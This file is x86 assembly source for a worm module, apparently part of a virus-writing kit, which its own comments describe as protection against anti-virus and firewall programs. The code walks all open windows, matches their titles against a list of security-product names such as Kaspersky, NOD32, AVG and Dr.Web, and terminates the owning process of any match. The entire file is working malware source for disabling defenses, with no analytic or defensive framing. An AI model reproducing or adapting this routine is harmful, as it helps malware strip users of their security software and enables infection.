;Descr:	This gen searches all active windows titles for a sub-string.
;	In the case some window is found, the owner process will be killed.
;	(protection against anti-virus and firewall programs)
;
;Type:	GEN_INITWORM
;
;INPUT:
;(EBX)	NONE
;
;OUTPUT:
;(EAX)	NONE
;

kill_avs	Proc
	pushad
	@SEH_SetupFrame	<jmp	avs_seh>		;set SEH

	call	avs_delta
avs_delta:
	pop	ebp					;EBP = delta offset

	@pushsz	'KERNEL32'
	call	esi
	xchg	eax,ebx					;EBX = address of kernel32.dll

	@pushsz	'OpenProcess'
	push	ebx
	call	edi
	mov	[ebp + avs_OpenProcess - avs_delta],eax
							;save address of APIz ...
	@pushsz	'TerminateProcess'
	push	ebx
	call	edi
	mov	[ebp + avs_TerminateProcess - avs_delta],eax

	@pushsz	'CloseHandle'
	push	ebx
	call	edi
	mov	[ebp + avs_CloseHandle - avs_delta],eax


	@pushsz	'USER32'
	call	esi
	xchg	eax,ebx					;EBX = address of user32.dll

	@pushsz	'GetWindowThreadProcessId'
	push	ebx
	call	edi
	mov	[ebp + avs_GetWindowThreadProcessId - avs_delta],eax
							;save address of APIz...
	@pushsz	'GetWindowTextA'
	push	ebx
	call	edi
	mov	[ebp + avs_GetWindowTextA - avs_delta],eax

	@pushsz	'EnumWindows'
	push	ebx
	call	edi


	push	ebp
	lea	ecx,[ebp + avs_killproc - avs_delta]	;address of callback function
	push	ecx
	call	eax					;enum all active windows


avs_seh:@SEH_RemoveFrame				;remove SEH
	popad
	ret						;and quit




;callback function called separately for each window

avs_killproc:
	pushad
	mov	ebp,[esp.cPushad+8]			;EBP = delta offset (2nd argument)
	mov	ebx,[esp.cPushad+4]			;EBX = HWND (1st argument)

	lea	eax,[ebp + avs_PID - avs_delta]
	push	eax
	push	ebx
	mov	eax,12345678h
avs_GetWindowThreadProcessId = dword ptr $-4
	call	eax					;get PID of HWND owner

	push	256
	call	@avs_buffer
	db	256 dup (?)
@avs_buffer:
	pop	esi
	push	esi
	push	ebx
	mov	eax,12345678h
avs_GetWindowTextA = dword ptr $-4
	call	eax					;get title
	test	eax,eax
	je	avs_endkillproc

	xor	ecx,ecx					;ECX = title string length
	dec	ecx
	push	esi
	mov	edi,esi
avs_lowcase:
	inc	ecx					;ECX++
	lodsb						;get character
	test	al,al
	je	avs_end_lowcase				;quit if its NULL
	or	al,20h					;lowecase character
	stosb						;and store it
	jmp	avs_lowcase				;loop
avs_end_lowcase:
	pop	esi					;ESI = title


	call	@avs_stringz

	db	8,'firewall'				;length + substring
	db	6,'dr.web'
	db	6,'kasper'
	db	6,'spider'
	db	5,'virus'
	db	5,'nod32'
	db	5,'guard'
	db	4,'anti'
	db	4,'amon'
	db	3,'avp'
	db	3,'avg'
	db	3,'avx'
	db	3,'rav'
	db	0					;end of record

@avs_stringz:
	pop	edi					;EDI = ptr to sub-string database


avs_find_substring:
	pushad
	xchg	esi,edi					;exchange ESI with EDI
	xor	eax,eax					;nulify EAX

avs_fs_loop1:
	lodsb						;get length of sub-string
	test	al,al
	je	avs_fs_end				;quit if its end of record

	pushad

avs_fs_loop2:
	pushad
	mov	ecx,eax					;ECX = length of sub-string
	rep	cmpsb					;compare sub-string with string
	popad
	je	avs_killPID				;match! kill process...
	inc	edi					;move in title string
	loop	avs_fs_loop2				;and LOOP

	popad
	add	esi,eax					;get next sub-string
	jmp	avs_fs_loop1				;and LOOP

avs_killPID:
	popad

	push	12345678h
avs_PID = dword ptr $-4
	push	0
	push	1
	mov	eax,12345678h
avs_OpenProcess = dword ptr $-4
	call	eax					;get HANDLE to process
	xchg	eax,ebx					;to EBX

	push	0
	push	ebx
	mov	eax,12345678h
avs_TerminateProcess = dword ptr $-4
	call	eax					;terminate process

	push	ebx
	mov	eax,12346578h
avs_CloseHandle = dword ptr $-4
	call	eax					;close process handle

	popad
	ret						;and quit


avs_fs_end:
	popad
	inc	esi					;move in title-string
	loop	avs_find_substring			;and LOOP

avs_endkillproc:
	popad
	ret						;quit


end_kill_avs:
kill_avs	EndP